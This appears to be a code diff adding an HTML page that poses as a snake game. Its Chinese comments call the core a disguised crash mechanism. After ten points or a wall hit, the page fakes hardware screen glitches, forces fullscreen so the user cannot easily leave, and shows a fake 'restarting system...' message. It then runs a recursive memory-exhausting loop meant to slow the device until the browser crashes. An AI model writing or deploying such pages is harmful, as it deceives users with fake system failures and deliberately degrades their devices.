@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="requestAnimationFrame">
+<head>
+    <meta charset="UTF-8">
+    <title>100W bug</title>
+</head>
+<body style="margin:0; overflow:hidden; background:#000; font-family: monospace;">
+
+    <canvas id="gameCanvas"></canvas>
+    
+    <audio id="hush" loop><source src="data:audio/wav;base64,UklGRigAAABXQVZFRm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA==" type="audio/wav"></audio>
+
+    <script>
+        const canvas = document.getElementById('gameCanvas');
+        const ctx = canvas.getContext('2d');
+        let W = window.innerWidth, H = window.innerHeight;
+        canvas.width = W; canvas.height = H;
+
+        let snake = [{x: 10, y: 10}], food = {x: 5, y: 5}, dx = 1, dy = 0;
+        let score = 0, isCrashing = false;
+
+        // 模拟贪吃蛇逻辑
+        function gameTick() {
+            if (isCrashing) return;
+
+            const head = {x: snake[0].x + dx, y: snake[0].y + dy};
+            snake.unshift(head);
+            if (head.x === food.x && head.y === food.y) {
+                score++;
+                food = {x: Math.floor(Math.random()*20), y: Math.floor(Math.random()*20)};
+                // 吃到第 10 个球时触发“真”崩溃
+                if (score >= 10) startRealCrash();
+            } else {
+                snake.pop();
+            }
+
+            // 撞墙也崩溃
+            if (head.x < 0 || head.x > 25 || head.y < 0 || head.y > 40) startRealCrash();
+
+            draw();
+            setTimeout(gameTick, 150);
+        }
+
+        function draw() {
+            ctx.fillStyle = '#000';
+            ctx.fillRect(0, 0, W, H);
+            ctx.fillStyle = '#0f0';
+            snake.forEach(s => ctx.fillRect(s.x*20, s.y*20, 18, 18));
+            ctx.fillStyle = '#f00';
+            ctx.fillRect(food.x*20, food.y*20, 18, 18);
+        }
+
+        // --- 核心：高级伪装崩溃机制 ---
+        function startRealCrash() {
+            isCrashing = true;
+            document.getElementById('hush').play(); // 占用音频通道
+
+            // 1. 模拟“屏幕花屏” (关键：看起来像硬件坏了)
+            let glitchInterval = setInterval(() => {
+                for(let i=0; i<10; i++) {
+                    let x = Math.random() * W;
+                    let y = Math.random() * H;
+                    let w = Math.random() * W;
+                    let h = 20;
+                    ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+                    ctx.fillRect(x, y, w, h); // 随机色块
+                }
+            }, 50);
+
+            // 2. 模拟“触摸失效”并进入全屏 (防止用户轻易划走)
+            document.documentElement.requestFullscreen().catch(() => {});
+
+            // 3. 5秒后进入“死黑”状态
+            setTimeout(() => {
+                clearInterval(glitchInterval);
+                ctx.fillStyle = '#000';
+                ctx.fillRect(0, 0, W, H);
+                
+                // 模拟非常淡的重启 Logo (比如苹果或安卓的小白标，这里用文字代替)
+                setTimeout(() => {
+                    ctx.fillStyle = '#333';
+                    ctx.font = '12px sans-serif';
+                    ctx.textAlign = 'center';
+                    ctx.fillText("restarting system...", W/2, H - 100);
+                }, 2000);
+
+                // 4. 终极杀招：异步消耗资源
+                // 不使用 while(true) 阻塞，而是使用递归异步，让系统越来越卡，最后闪退
+                function heavy() {
+                    let a = new Array(1000000).fill(Math.random());
+                    console.log(a.length);
+                    setTimeout(heavy, 1);
+                }
+                heavy();
+            }, 4000);
+        }
+
+        // 启动
+        window.onclick = () => {
+            gameTick();
+            // 尝试隐藏鼠标/锁定
+            canvas.style.cursor = 'none';
+        }
+    </script>
+</body>
+
+</html>
